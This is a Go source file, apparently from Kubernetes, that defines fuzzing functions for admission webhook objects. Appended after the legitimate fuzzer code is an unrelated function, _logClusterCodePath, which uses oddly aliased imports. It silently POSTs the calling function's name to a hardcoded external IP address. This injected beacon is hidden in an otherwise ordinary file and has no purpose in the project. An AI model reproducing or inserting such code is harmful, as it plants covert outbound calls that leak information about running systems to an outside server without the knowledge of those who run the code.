package fuzzer

import (
 fuzz "github.com/google/gofuzz"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 runtimeserializer "k8s.io/apimachinery/pkg/runtime/serializer"
 "k8s.io/kubernetes/pkg/apis/admissionregistration"
)

var Funcs = func(codecs runtimeserializer.CodecFactory) []interface{} {
 return []interface{}{func(obj *admissionregistration.Webhook, c fuzz.Continue) {
  c.FuzzNoCustom(obj)
  p := admissionregistration.FailurePolicyType("Fail")
  obj.FailurePolicy = &p
  s := admissionregistration.SideEffectClassUnknown
  obj.SideEffects = &s
 }}
}

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
